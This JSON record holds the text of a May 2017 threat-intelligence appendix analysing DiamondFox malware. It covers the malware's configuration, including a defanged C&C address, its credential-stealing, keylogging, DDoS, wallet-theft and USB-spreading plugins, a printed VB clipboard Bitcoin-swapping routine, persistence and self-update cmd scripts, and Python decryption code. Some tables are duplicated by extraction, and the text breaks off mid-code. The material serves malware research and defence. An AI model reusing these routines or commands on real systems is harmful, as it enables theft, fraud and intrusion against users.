{
    "id": "05d8c575-a724-4922-8680-4ce91849c56a",
    "created_at": "2022-10-25T16:48:15.482017Z",
    "updated_at": "2025-03-27T02:16:59.218429Z",
    "deleted_at": null,
    "sha1_hash": "2b24afeb825a14b4eb637371dadbb0eca60651c6",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-05-10T09:18:05Z",
    "file_modification_date": "2017-05-10T09:18:07Z",
    "file_size": 614066,
    "plain_text": "# DiamondFox Modular Malware\n\n#### A ONE-STOP SHOP\n\n## APPENDICES\n\n###### MAY 10, 2017\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n### TABLE OF CONTENTS\n\nAppendix A....................................................................................................  3\n\nConfiguration Data..................................................................................  3\n\nPurpose of Files.......................................................................................  5\n\nVolume Serial Number Initialization........................................................  6\n\nPlugins.....................................................................................................  6\n\nC&C Commands...................................................................................... 14\n\nDetected Anti-Virus Software.................................................................. 15\n\nAppendix B.................................................................................................... 16\n\nSource Code Snippets.............................................................................. 16\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n##### Appendix A\n\n###### CONFIGURATION DATA\n\nThis section describes the meaning of values in the decrypted configuration.\n\n|Option Number|Purpose|Functionality|Value|\n|---|---|---|---|\n|0x00|Network|Address of the C&C server (referred to as C&C_ADDR). If the length of C&C_ADDR is less than 11 bytes, it is used as the initial date in DGA.|hxxp://86.110.117.207/home/gate.php|\n|0x01|Network|Query for the command delay in seconds (referred to as CMD_DELAY).|90|\n|0x02|Key|Used as part of IDs during communication with the C&C server; encryption key; used as part of the DGA (referred to as NET_XOR_KEY).|6083623a732c8349a16cb9d5b6d84b61|\n|0x03|Key|Decryption key; mutex name; used as part of the DGA (referred to as XOR_KEY).|KWLdVfMiNNaUcrAddAaYhTt21NTySR|\n|0x04|Network|User Agent used when sending HTTP packets to the C&C server (referred to as USER_AGENT).|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36|\n|0x05|Bitcoin Spoofing Plugin|Bitcoin wallet address (referred to as BTC_ADDR).|1EUb4t3dQTxWQ7UYRep54MnJhrNsiK S5RL|\n|0x06|Anti-VM|Terminate execution if the call to LoadLibrary with pthreadVC.dll succeeded.||\n|0x07|Anti-VM|Terminate execution if the call to LoadLibrary with vboxmrxnp.dll succeeded.||\n|0x08|Anti-VM|Terminate execution if the call to LoadLibrary with vmGuestLib.dll succeeded.||\n|0x09|Anti-VM|Terminate if VOLUME_SERIAL_NUM is equal to AC79B241.|1|\n|0x0A|Anti-VM|Terminate if VOLUME_SERIAL_NUM is equal to AC79B241.|1|\n|0x0B|Anti-VM|Terminate execution if the call to LoadLibrary with SbieDLL.dll succeeded.|1|\n|0x0C|Anti-VM|Terminate if VOLUME_SERIAL_NUM is equal to 70144646.|1|\n|0x0D|Anti-VM|Terminate if VOLUME_SERIAL_NUM is equal to 6C78A9C3.|1|\n|0x0E||Perform delay.|1|\n|0x0F|UAC|Enable custom UAC bypass checking for the consent.exe application to finish.|1|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n|Option Number|Purpose|Functionality|Value|\n|---|---|---|---|\n|0x10|Tools|Disable Registry Tools by setting the following registry key: HKCU\\Software\\Microsoft\\ Windows\\CurrentVersion\\Policies\\System\\ DisableRegistryTools|1|\n|0x11|Tools|Disable Registry Tools by setting the following registry key: HKCU\\Software\\Microsoft\\ Windows\\CurrentVersion\\Policies\\ System\\DisableRegistryTools|1|\n|0x12|Anti-VM|Terminate execution if the call to LoadLibrary with snxhk.dll succeeded.|1|\n|0x13|Plugin|Removable self-spreading devices.|1|\n|0x14||||\n|0x15|Image|New name of the DiamondFox binary (referred to as EXE_NAME).|explorer|\n|0x16|Image|Directory under which the GodMode folder is created (referred to as MAIN_DIR).|APPDATA|\n|0x17|Persistence|Add self to auto run: HKCU\\Software\\ Microsoft\\Windows\\CurrentVersion\\ run|1|\n|0x18|Persistence|Add self to auto run: HKCU\\Software\\ Microsoft\\Windows\\CurrentVersion\\ RunOnce|1|\n|0x19|Persistence|Copy self-image to the Startup Special Folder under EXE_NAME|1|\n|0x1A||Delete self-image & terminate self after copying to %DF_DIR%\\EXE_NAME.exe.|1|\n|0x1B|Keylogger Plugin|Download & Execute Keylogger plugin.|1|\n|0x1C|Plugin 13|Activate Plugin 13.||\n|0x1D|Screenshot Plugin|Download & Execute Screenshot plugin in the Main Loop.|1|\n|0x1E|Hosts Spoofing Plugin|Activate/deactivate Hosts Spoofing plugin.||\n|0x1F|Plugin|Terminate the Chrome.exe and firefox.exe processes. Remove the following directories/ files: %LOCALAPPDATA%\\Google\\Chrome\\User Data %APPDATA%\\Mozilla\\Firefox\\Profiles %APPDATA%\\Mozilla\\Firefox\\Profli es.ini||\n|0x20|Watchdog Plugin / Persistence|Persistence flag; download & execute Watchdog plugin.|1|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n**Option**\n**Number** **Purpose** **Functionality**\n\n`0x21` Persistence Add self to auto run: HKCU\\Software\\ `1`\n```\n             Microsoft\\Windows\\CurrentVersion\\\n             Policies\\Explorer\\Run\n\n```\n`0x22` Persistence Add scheduled task: schtasks /create /sc `1`\n```\n             ONLOGON /tn EXE_NAME.exe /tr %PATH_\n             TO_EXE%\n\n```\n`0x23` Clean environment from previous run by `1`\nterminating wscript.exe process; remove\n```\n             .exe and .vbsfiles from the %APPDATA%,\n             %TEMP% and Startup Special Folder.\n\n```\n`0x24` Image Name of the GodMode directory where the main\nDiamond Fox executable is stored (referred to as `C46C66EA7F33}`\n```\n             EXE_DIR).\n\n```\n`0x25` Network TLD list for DGA (referred to as CFG_TLDS).\n\n`0x26` Network Domain length in DGA (referred to as\n```\n             CFG_DOMAIN_LEN).\n\n```\n`0x27` Network Number of domains to generate in DGA (referred\nto as CFG_DOMAINS_COUNT).\n\n`0x28` Network Period days in DGA (referred to as\n```\n             CFG_PERIOD_DAYS).\n\n###### PURPOSE OF FILES\n\n```\nThis section details the purpose of files used by the Diamond Fox main module and its plugins.\n\n|Option Number|Purpose|Functionality|Value|\n|---|---|---|---|\n|0x21|Persistence|Add self to auto run: HKCU\\Software\\ Microsoft\\Windows\\CurrentVersion\\ Policies\\Explorer\\Run|1|\n|0x22|Persistence|Add scheduled task: schtasks /create /sc ONLOGON /tn EXE_NAME.exe /tr %PATH_ TO_EXE%|1|\n|0x23||Clean environment from previous run by terminating wscript.exe process; remove .exe and .vbsfiles from the %APPDATA%, %TEMP% and Startup Special Folder.|1|\n|0x24|Image|Name of the GodMode directory where the main Diamond Fox executable is stored (referred to as EXE_DIR).|com6.{00C6D95F-329C-409a-81D7- C46C66EA7F33}|\n|0x25|Network|TLD list for DGA (referred to as CFG_TLDS).||\n|0x26|Network|Domain length in DGA (referred to as CFG_DOMAIN_LEN).||\n|0x27|Network|Number of domains to generate in DGA (referred to as CFG_DOMAINS_COUNT).||\n|0x28|Network|Period days in DGA (referred to as CFG_PERIOD_DAYS).||\n\n|File Name|Full Path|Content Type|Description|\n|---|---|---|---|\n|log.c|APP_PATH|Binary/RAW|Contains the encrypted PE of Keylogger plugin.|\n|win.c|APP_PATH|Text|Configuration for Keylogger plugin (received by U2 Request).|\n|dwn.exe|APP_PATH|Binary/EXE|Copy of original image (hosts Keylogger plugin).|\n|keys.c|APP_PATH|Text|Contains keystrokes, filled by Keylogger plugin.|\n|ss.c|APP_PATH|Image/JPEG|Contains screenshot that is taken by Screenshot plugin.|\n|pos.exe|%APPDATA%|Binary/EXE|Plugin 13 decrypted content.|\n|output.txt|%APPDATA%||Output of Plugin 13.|\n|Off.c|APP_PATH||Hosts Spoofing plugin is deactivated.|\n|email.txt|APP_PATH||Data from U0 request (configuration for SpamSender plugin).|\n|0.c|%APPDATA%||Output of FTP Credentials Stealer plugin.|\n|1.c|%APPDATA%||Output of Mail Passwords Grabber plugin.|\n|2.c|%APPDATA%||Output of Web Browser Passwords Grabber plugin.|\n|3.c|%APPDATA%||Output of Remote Desktop App Passwords Grabber plugin.|\n|4.c|%APPDATA%||Output of Messengers Passwords Grabber plugin.|\n|5.c|%APPDATA%||Output of VNC Passwords Grabber plugin.|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### VOLUME SERIAL NUMBER INITIALIZATION\n\nDiamondFox initializes a value internally named VOLUME_SERIAL_NUM. This value is used to detect if the application is\nrunning on an emulation environment and as a part of the victim's PC related information. To choose this value, DiamondFox\nfollows a logic described in the Volume Serial Number Initialization section in Appendix B.\n\n###### PLUGINS\n\nThis section covers the technical description of several DiamondFox plugins.\n\n###### Plugin 0: FileZilla FTP credentials stealer\n\nThis plugin is responsible for data theft FileZilla FTP Clients, and accepts the following command line arguments:\n\n\n/stext %out_file%\n\n\nThe plugin opens %APPDATA%\\FileZilla\\recentservers.xml, %APPDATA%\\FileZilla\\sitemanager.xml and\nlooks for the following XML entries:\n\n**Tag** **Content**\n\n`<Host>` Host name\n\n`<Port>` Port number\n\n`<Port>` Port number\n\n`<User>` User name\n\n`<Pass encoding \"base64\"> or <Pass>` Password (if applicable, decode data using the base64 algorithm)\n\n`<Name>` Name in Manager\n\nThe parsed data is then saved to the %out_file% using the following format:\n\n|Tag|Content|\n|---|---|\n|<Host>|Host name|\n|<Port>|Port number|\n|<Port>|Port number|\n|<User>|User name|\n|<Pass encoding \"base64\"> or <Pass>|Password (if applicable, decode data using the base64 algorithm)|\n|<Name>|Name in Manager|\n\n```\n==================================================\nHost: %host_name%\nPort: %port%\nUser: %username%\nPass: %password%\nName: %man_name%\n==================================================\n\n```\n\nThe output is saved to the %out_file% and is then sent to the C&C server by the Main Module.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Plugin 7: Spam Sender\n\nThis plugin is responsible for sending spam emails from the infected machine, based on the content parsed from the\nconfiguration file email.txt file for the following XML entries:\n\n**Tag** **Content**\n\n`<tto>` Recipient's emails (If there are multiple emails, each email should start with a new string ))\n\n`<from>` Sender email\n\n`<pass>` Password\n\n`<smtp>` SMTP server hostname\n\n`<subject>` Subject of email\n\n`<textbody>` Text body of email\n\nAfter parsing the file content, the plugin performs the following actions for each spam email recipient:\n\n1. SSL connection on port 465 of the SMTP server.\n\n2. Authenticate on the <from> account using the <pass> password.\n\n3. Use <textbody> as the email message.\n\n4. Send the composed message to the recipient.\n\n###### Plugin 8: Browsers Home Page Changer\n\nThis plugin is responsible for changing the home page of Mozilla Firefox and Internet Explorer browsers.\n\nThe following command line argument is expected:\n\n|Tag|Content|\n|---|---|\n|<tto>|Recipient's emails (If there are multiple emails, each email should start with a new string ))|\n|<from>|Sender email|\n|<pass>|Password|\n|<smtp>|SMTP server hostname|\n|<subject>|Subject of email|\n|<textbody>|Text body of email|\n\n```\n%homepage%\n\n```\n\nThe following actions are taken to change each of the browsers’ homepages:\n\n1. Mozilla Firefox:\n\na. Get the path to the user's directory by reading the Path key from the Profile0 section in the\n%APPDATA%\\Mozilla\\Firefox\\profiles.ini file.\n\nb. Add the user_pref(\"browser.startup.homepage\", %homepage%) line to the prefs.js file in the\nvictim’s directory.\n\n2. Internet Explorer homepage\n\na. Change this registry key:\n\n```\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page = %homepage%\n\n```\n\n###### Plugin 9: Social Networks Spreading\n\nThis plugin is responsible for spreading messages delivered by the C&C server via Facebook and Twitter.\n\nThe following command line argument is expected:\n\n```\n%message_content%\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\nTo post a new tweet on Twitter, the following actions are performed:\n\n1. Check if any foreground window contains twitter text. If one does, proceed to the next stages.\n\n2. Sleep for 6 seconds, and then press the N button (used to add a new tweet).\n\n3. Sleep for 0.8 seconds, then paste %message_content% in the tweet content.\n\n4. Press {TAB} to shift the focus to the post button.\n\n5. Press {ENTER} to post the tweet.\n\nTo send a message on Facebook, the following actions are performed:\n\n1. Press Alt-M to enable a New Message window.\n\n2. Insert the previously generated random character into the New Message window and click {ENTER} to select a person.\n\n3. Move to the message field by clicking {TAB} and paste the %message_content% content.\n\n4. Click {ENTER} to send a message.\n\n###### Plugin 10: DDoS\n\nThis plugin is responsible for performing DDoS attacks on specified servers. There are a few types of DDoS, such as HTTP\nflood, UDP flood, bandwidth saturation, and more.\n\nThe attack types featured by the plugin are listed here:\n\n**1. UDP Flood**\n\nThe plugin accepts the following parameters:\n\n```\n1|C&C_ADDR|USER_AGENT|PACKETS_COUNT|SERVER\n\n```\n\nThese actions are performed multiple times, based on the number configured in the PACKETS_COUNT parameter:\n\n1. Randomly generate a port number in the range between 1 and 65000.\n\n2. Send the data \"\\xFF\" * 65000 to the SERVER address on the generated port.\n\n3. Sleep for 1 second.\n\nThe plugin then sends a Flood Done request to the C&C server to notify that the attack ended, using USER_AGENT as the\nUser-Agent.\n\n**2. HTTP Flood**\n\nThe plugin accepts the following parameters:\n\n```\n2|C&C_ADDR|USER_AGENT|PACKETS_COUNT|SERVER\n\n```\n\nIt sends the PACKETS_COUNT HTTP GET requests to the SERVER address with the following headers, and with a one\nsecond delay between each packet:\n\n```\nConnection: keep-alive\nUser-Agent: USER_AGENT\n\n```\n\nDue to a limited number of parallel connections, the plugin attempts to carry out a DDoS attack by using a keep-alive\nconnection type.\n\nThe plugin then sends a Flood Done request to the C&C server to notify that the attack ended, using USER_AGENT as the\nUser-Agent.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n**3. HTTP Flood**\n\nThe plugin accepts the following parameters:\n\n```\n3|C&C_ADDR|USER_AGENT|PACKETS_COUNT|SERVER|{RS|GT}\n\n```\n\nFlood type is determined by the last command line argument value (RS or GT).\n\nThe plugin sends a Flood Done request to the C&C server to notify that the attack ended, using USER_AGENT as the\nUser-Agent.\n\n**HTTP Flood RS**\nThe plugin downloads data using an HTTP GET request from the SERVER URL multiple times, based on the number\nconfigured in the PACKETS_COUNT parameter, and using USER_AGENT as the User-Agent. The data is saved to the\nfollowing files and then deleted:\n\n```\n\"%TEMP%\\{%d_%s}.layer\" % (DOWNLOAD_RETRY_COUNT, random_8_bytes_string)\n\n```\n\nThe execution between requests occurs in a one second interval.\n\n**HTTP Flood GT**\nThe plugin sends the HTTP GET request on the SERVER URL multiple times, based on the number configured in the\nconfigured in the PACKETS_COUNT parameter, and using USER_AGENT as the User-Agent.\n\nThe execution between requests occurs in a one second interval.\n\n###### Plugin 11: Watchdog\n\nThis plugin is responsible for monitoring the DiamondFox Main Module, and checking if it is alive. An encrypted version of the\nplugin can be downloaded from the C&C server by sending a P11 request; the content of the plugin is permanently stored in\nthe server’s memory. The Watchdog plugin can be activated only if a specific configuration flag is enabled. Upon decryption,\nthe plugin's content is injected using Reflective Loader in the %WINDIR%\\system32\\wscript.exe process, which is\nresponsible for hosting the plugin.\n\nThe plugin accepts the following command line arguments:\n\n```\nRC4_Key|PATH_TO_EXE\n\n```\n\nIt attempts to create a mutex named PATH_TO_EXE. If a mutex with this name already exists in the system, the plugin is\nterminated. If not, the plugin repeatedly performs the following steps with a 10 second delay between each cycle:\n\n1. If the %TEMP%\\RC4_Key file is not found on the disk, the PATH_TO_EXE file is encrypted using RC4 with RC4_Key as a key.\n\nThe encrypted file is saved to the %TEMP%\\RC4_Key file.\n\n2. The Plugin checks if the PATH_TO_EXE file is present on the disk. If it does not exist, the %TEMP%\\RC4_key file is\n\ndecrypted to the %TEMP%\\RC4_key.exe file. The PATH_TO_EXE file is then executed.\n\n3. To check if the binary was started, the plugin executes the select * from win32_process command. If no such\n\nprocess exists, which is equal to PATH_TO_EXE, the PATH_TO_EXE is started again.\n\n**Note – the detailed solution contains a bug: Although DiamondFox stores a copy of itself in the %TEMP% directory, this image**\nis never used for execution. If the original PATH_TO_EXE file is missing, the malware only attempts to run the binary from the\noriginal location. Therefore, if it is missing, the plugin will not work properly.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Plugin 12: Keylogger\n\nThis plugin is responsible for keylogging from specific windows defined in the configuration win.c file by the C&C server. An\nencrypted version of the plugin can be downloaded from the C&C server and saved to the log.c file by sending a P12 request.\nThe plugin can be downloaded only if a specific configuration flag is enabled. If the plugin is already active or an encrypted\nversion of it is already present on the disk, the malware decrypts the records using the same algorithm used for the first-layer\nconfiguration decryption:\n\n```\nwith open('log.c', 'rb') as f:\n  klg = f.read()\nkey = calculate_dec_key(klg)\nkey = calculate_key(klg)\nklg = decrypt_data(klg, key)\n\n```\n\nKeylogger plugin uses the win.c file for configuration. The file content can be updated by sending a U2 request to the C&C\nserver. The file will be updated only if the decoded data contains a comma and its length is greater than four bytes. The data\nrecords are stored on the keys.c file. The file content is removed before the Keylogger starts recording keystrokes.\n\nThe dwn.exe process is used for hosting the Keylogger plugin. The decrypted content of the log.c file is injected to the\n```\ndwn.exe using Reflective Loader. If the plugin is deactivated, the dwn.exe application which hosts it is terminated, and the\nlog.c, dwn.exe, win.c and keys.c files are removed.\n\n```\nFirst, the plugin creates a KY-%COMPUTERNAME% mutex. If a mutex with this name already exists in the system, the plugin is\nterminated. The plugin reads the content of the win.c configuration file, but only if the data contains a comma and its length\nis greater than four bytes. If not, no configuration is used.\n\nThe win.c file contains window captions that should be skipped while recording the keystrokes. The hook is installed on lowlevel keyboard inputs by using the SetWindowsHookEx function with the WH_KEYBOARD_LL parameter.\n\nAll of the information recorded is saved to the keys.c file in the following format:\n\n```\n[{WINDOW_CAPTION}] - [{DATE_TIME}]\n{PRESSED_KEY}{PRESSED_KEY}\n\n```\n\nClipboard content is also saved to the keys.c file, in the following format:\n\n```\n[{WINDOW_CAPTION}] - [{DATE_TIME}]\n{PRESSED_KEY}{PRESSED_KEY}\n\n```\n\nThe content of the key.s file is sent to the C&C server by the Main Module. Below is an example of the records stored on the\n```\nkey.s file:\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Plugin 14: Remote Tiny Task Manager\n\nThis plugin is responsible for collecting and sending information about running processes and software installed on the\nvictim's machine. The plugin can also terminate specified processes and execute shell commands. It accepts the following\narguments:\n\n```\nCMD|URL|USER_AGENT|DATA\n\n```\n\nThe plugin performs several actions on the victim’s machine, depending on the CMD value. The values range between 1 and 4:\n\n1. Send list of currently running processes.\n\n2. Kill process with the PID specified in the DATA.\n\n3. Execute shell commands specified in the DATA and send results.\n\n4. Send a list of installed software.\n\nAfter executing one of the specified commands, the plugin encodes the collected information using the base64 algorithm.\nThe data is sent to the C&C server using a C request.\n\n**Note – The encoded data length must not exceed the maximum query string length of 2048 bytes for the MSXML2.XMLHTTP**\nlibrary. If it does, the data will not be sent.\n\nA technical description of each of the commands is detailed here:\n\n**1. Command 1: List Processes**\n\nThe plugin collects information about processes currently running in the system and records the information in the\nfollowing format:\n\n```\n[%datetime%]\n%processname_0% [pid: %pid_0%]\n%processname_1% [pid: %pid_1%]\n%processname_2% [pid: %pid_2%]\n\n```\n\nA list of processes can be obtained by executing the SELECT * FROM Win32_Process command.\n\n**2. Command 2: Kill Process**\n\nThe plugin terminates a process with a PID that is equal to the one specified in the DATA argument, using the following\ncommand:\n\n```\ntaskkill /PID %DATA% /F\n\n```\n\n**3. Command 3: Execute Shell Command**\n\nThe plugin executes shell commands specified in the DATA argument and saves the program output.\n\n**4. Command 4: Installed Software**\n\nThe plugin collects software installed on the victim's machine by reading the DisplayName value from the\n```\n SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ registry sub keys, using the following format:\n\n```\n```\n{Software_1_DisplayName}\n{Software_2_DisplayName}\n\n```\n\nBelow is an example of installed software:\n\n```\nFar Manager\n7-zip\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Plugin 15: Remote Desktop\n\nThis plugin is responsible for starting/stopping RDP sessions depending on the passed command line arguments.\n\nThis plugin is responsible for starting and stopping RDP sessions on the victim's machine.\n\nThe following commands start an RDP session on the victim’s machine:\n\n1. `|C&C_ADDR|USER_AGENT|`\n\n2. `1`\n\nRDP functionality is delivered by running a legitimate AMMYY Admin application in hidden mode. In this case, the application\nhas a valid certificate signed by VeriSign.\n\n**1. Start RDP**\n\nThis subsection describes actions the Remote Desktop plugin performs to start an RDP session.\n\nIf the WindowsIndexer.exe process is not running on the machine, the following preparatory steps are taken:\n\n1. The original image is copied to the %TEMP%\\WindowsIndexer.exe file.\n\n2. The configuration files for the AMMYY Admin application are extracted to the ${CSIDL_COMMON_APPDATA}\\AMMYY\ndirectory:\n\n```\nhr\nhr3\nsettings3.bin\n\n```\n\n3. The %TEMP%\\WindowsIndexer.exe executable is started as a host for the AMMYY Admin application. Functionality\nis injected by using RunPE technique. Code for injection is taken from the RDP/101 section of the original image.\n\n4. The LOADER application is injected to a new instance of self-image using the RunPE technique. The code is extracted\nfrom the LOADER/101 resource. The following command line arguments are expected by the LOADER:\n\n```\nHello %AMMYY_PID%\n\n```\n\n5. The main purpose of the LOADER is to extract the RDP session id from the AMMYY Admin application. The extracted\nsession id is then saved to the %APPDATA%\\ID.txt file. The session id length is 10 bytes and it is located at the\n```\n 0x4A39A0 virtual address of the AMMYY Admin application process.\n\n```\nWhen all of the steps detailed above were completed, or if the WindowsIndexer.exe process was already running on the\nmachine, the plugin waits for the appearance of the %APPDATA%\\ID.txt file. Next, the content of %APPDATA%\\ID.txt file\nis sent to the C&C server using an R request.\n\n**2. Stop RDP**\n\nThis mode is responsible for ceasing RDP sessions. To stop an RDP session, do the following actions:\n\n1. Execute a command which terminates all RDP-related processes:\n\n```\ntaskkill /IM WindowsIndexer.exe /F\n\n```\n\n2. Remove the %TEMP%\\WindowsIndexer.exe file.\n\n3. Remove the ${CSIDL_COMMON_APPDATA}\\AMMYY folder.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Crypto Currency Wallets Stealer\n\nDiamondFox malware can steal crypto currency wallets located on the victim's machine.\n\nHere are the crypto currencies whose wallets can be stolen:\n\nBitcoin BitcoinDark MultiBit Armory Electrum Digital Electrum-LTC\n\nMultiDoge Unobtanium Dash Litecoin Namecoin PPcoin Feathercoin\n\nNovacoin Primecoin Terracoin Devcoin Anocoin Paycoin Worldcoin\n\nQuarkcoin Infinitecoin Dogecoin Asicoin Lottocoin Darkcoin Monacoin\n\nDiamondFox checks if these crypto currency wallets are present in the %APPDATA% directory. If a wallet does exist, the\nmalware looks for the *.wallet files inside. Any file found is sent to the C&C server by the Main Module using a File Upload\nrequest.\n\n###### Bitcoin Address Spoofing\n\nDiamondFox can also spoof the Bitcoin address that is currently present in the clipboard.\n\nTo do so, the malware checks if the length of the BTC_ADDR from the configuration is equal to the valid Bitcoin address length.\n\nIf the length of the data on the clipboard is equal to 0x22 bytes and the first byte is 0x31, the malware inserts the BTC_ADDR\nto the clipboard instead of the present buffer.\n\nBelow is an example of a Bitcoin address spoofing routine:\n```\n  Public Sub SpoofBtcAddress()\n    Dim BtcAddr As String\n    Dim ctext As String\n\n```\nBtcAddr = \"1EUb4t3dQTxWQ7UYRep54MnJhrNsiKS5RL\" 'BTC_ADDR from configuration\n```\n    ctext = Clipboard.GetText()\n    If (Len(BtcAddr) = &H22) Then\n      If ((AscW(ctext) = &H31) And (Len(ctext) = &H22)) Then\n        MsgBox \"Real BtcAddress: \" & ctext\n        Clipboard.Clear\n        Clipboard.SetText (BtcAddr)\n      End If\n    End If\n    ctext = Clipboard.GetText()\n    MsgBox \"Pasted BtcAddress: \" & ctext\n  End Sub\n\n###### Removable Drives Self-Spread\n\n```\nDiamondFox performs self-spreading via removable devices. This functionality is only enabled if the specific configuration flag\nis set. The following actions are performed for the malware to self-spread:\n\n1. Copy a DiamondFox image to the MSOCache.pif file on the removable device, and set the System|Hidden attributes for\n\nthat file.\n\n|Bitcoin|BitcoinDark|MultiBit|Armory|Electrum|Digital|Electrum-LTC|\n|---|---|---|---|---|---|---|\n|MultiDoge|Unobtanium|Dash|Litecoin|Namecoin|PPcoin|Feathercoin|\n|Novacoin|Primecoin|Terracoin|Devcoin|Anocoin|Paycoin|Worldcoin|\n|Quarkcoin|Infinitecoin|Dogecoin|Asicoin|Lottocoin|Darkcoin|Monacoin|\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n2. Enumerate all files in the root directory but do not include files with: .lnk extension, no extension and files previously\n\ncopied MSOCache.pif. The following actions are then performed on any remaining files (filename).\n\na. Set file attributes to System|Hidden for the original filename.\n\nb. Create a file named this way:\n\n\nDrive.Path + \"\\\" + %filename_no_ext% + \".lnk\"\n\n\nc. Set a default icon for the file extension by querying the registry key presented below. If the attempt succeeds, the\ndefault icon value is set for the created .lnk file. If not, the default icon is used.\n\n```\n\"HKLM\\software\\classes\\.\" + %extension% + \"\\defaulticon\\\"\n\n```\n\nd. Set the target path of the .lnk file to the cmd.exe file. The following arguments are passed to the application:\n\n\n/c start MSOCache.pif &start %filename% &exit\n\n\n3. Enumerate all the sub-folders in the root directory and perform the following actions (foldername):\n\na. Set folder attributes to System|Hidden.\n\nb. Create a new file named this way:\n\n```\nDrive.Path + “\\\" + %foldername% + \".lnk\"\n\n```\n\nc. Get a default icon for folders by querying the following registry key and then set it as an icon for the created .lnk file:\n\n```\nHKLM\\software\\classes\\folder\\defaulticon\\\n\n```\n\nd. Set the target path of the .lnk file to cmd.exe. Arguments passed to the application are presented below:\n\n```\nHKLM\\software\\classes\\folder\\defaulticon\\\n\n```\n\nThe plugin is used to infect all removable devices currently connected to the computer.\n\nFrom this point on, these removable devices can be used to infect any clean computers they connect to. When a forged file or\nfolder on the infected removable device is clicked, DiamondFox will be executed.\n\n###### C&C COMMANDS\n\nThis section covers the technical details of some of the commands delivered by the C&C server to the bot.\n\n###### Command 3: Self Update\n\nDiamondFox downloads the file from the %cmd_args% URL. The data is then dropped to the %TEMP% directory under a\nrandom filename. If the %cmd_args% resource name has a .vbs extension, this extension is appended to the filename. If not,\nan .exe extension is appended instead.\n\nThe randomly-named file with a .cmd extension is created in the %TEMP% directory (%cmd_file%). Its content is presented\nbelow:\n\n```\nping -n 4 127.0.0.1 > nul\nrd /q /s \"\\\\.\\%exe_dir%\"\n\n```\nstart %path_to_dropped_file%\ndel /F %cmd_file%\n\n\nAfterward, %cmd_file% script is started using the VB Shell function. All of the self-running processes are terminated.\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Command 19: Remove Self\n\nDiamondFox features a self-removal functionality. The following steps are performed to implement self-removal:\n\n1. Remove the L!NK registry key setting using the VB DeleteSetting function.\n\n2. All of Diamond Fox’s related processes are terminated using the taskkill command:\n\n```\ndwn.exe\nwscript.exe\npos.exe\n\n```\n\n3. The following files are removed:\n\n```\n%StartupSpecialFolder%\\EXE_NAME.exe\n%WINDIR%\\system32\\drivers\\etc\\hosts\n%APPDATA%\\output.txt\n%APPDATA%\\pos.exe\n\n```\n\n4. Enable Registry Tools and Task Manager by setting the following registry key values to 0:\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskManager\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\n\n```\n\n5. Delete startup entries for the following registry keys:\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\%EXE_NAME%\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\run\\%EXE_NAME%\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\%EXE_NAME%\n\n```\n\n6. Terminate all previously scheduled tasks by executing the following command line:\n\n```\nschtasks /end /tn %EXE_NAME%.exe\n\n```\n\nAt this point, the randomly-named file with the .cmd extension is created in the %TEMP% directory (%cmd_file%). The content\nof this file is presented below:\n\n```\nrd /q /s \"\\\\.\\%exe_dir%\"\n\n```\ndel /F %cmd_file%\n\n\nFinally, the %cmd_file% script is started using the VB Shell function and terminates the self-running process.\n\n###### DETECTED ANTI-VIRUS PRODUCTS\n\n|Kaspersky AVP|Norton|Malware Bytes|Zonealarm|Bitdefender|Emsisoft|\n|---|---|---|---|---|---|\n|ESET|Avira|AVG|Windows Defender|F-Secure|Spybot|\n|McAfee|Trend Micro|360 Total Security|Panda|Byte Fence||\n\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n##### Appendix B\n\n###### MALWARE FUNCTIONALITY AND PAYLOAD\n\n Configuration Section Decription\n\n**Upper Layer Decryption Algorithm**\n```\nfrom base64 import b64decode\nimport math\ndef decrypt_data(conf, key):\n  init_vec = list()\n  lln = len(key)\n  for i in xrange(0, 0x100):\n    init_vec.append(i)\n  for i in xrange(0x100, 0x11D+1):\n    init_vec.append(i ^ 0x100)\n  # incorrect initialization\n  for i in xrange(1, 6+1):\n    init_vec[i+0xF9] = ord(key[lln - i - 1])\n    init_vec[i-1] = ord(key[i - 1]) ^ (255 - ord(key[lln - i - 1]))\n  init_vec_idx = 0\n  n = 0\n  conf_d = ''\n  for i in xrange(len(conf)):\n    if init_vec_idx > 0x11D and n == 0:\n      init_vec_idx = 0\n      n = 1\n    elif init_vec_idx > 0x11D and n == 1:\n      init_vec_idx = 5\n      n = 0\n    conf_d += chr(ord(conf[i]) ^ init_vec[init_vec_idx] ^ ord(key[i % lln]))\n    init_vec_idx += 1\n  return conf_d\ndef calculate_dec_key(conf):\n  s = 0xF\n  fs = '%.15f'\n  kk = (fs % round(math.cos(math.sqrt(len(conf))), s)).split('.')[1].rstrip(\"0\")\n  return kk\ndef calculate_key(data):\n  kc = ''.join(str(ord(d)) for d in data)\n  return kc\n\n```\nwith open('config_enc.dat', 'rb') as f:\n```\n  conf = f.read()\nkey 